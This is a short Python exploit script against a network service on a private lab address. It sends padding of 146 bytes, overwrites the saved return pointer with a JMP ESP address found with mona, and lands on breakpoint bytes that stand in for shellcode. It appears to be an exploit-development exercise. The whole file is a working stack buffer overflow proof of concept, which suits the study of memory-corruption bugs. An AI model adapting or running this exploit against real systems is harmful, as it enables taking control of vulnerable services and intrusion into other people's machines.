#!/usr/bin/env python
import socket
import struct

# target --
RHOST = "192.168.0.139"
RPORT = 31337

# create socket --
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# total buf(len)
# offset from mona! / msf-pattern-offeset
buf_totalen = 1024
offset_srp = 146 

# prtr_jmp_esp
# from: !mona jmp -r esp -cpb "\x00\x0A"
ptr_jmp_esp = 0x080414c3

# test offsets --
# add badchar_test to payload --
buf = ""
buf += "A"*(offset_srp - len(buf)) # padding
buf += struct.pack("<I", ptr_jmp_esp)	# SRP overwrite
buf += "\xCC\xCC\xCC\xCC" # ESP points here 
buf += "D"*(buf_totalen - len(buf))	#trailing padding
buf += "\n"

# send the buffer --
s.send(buf)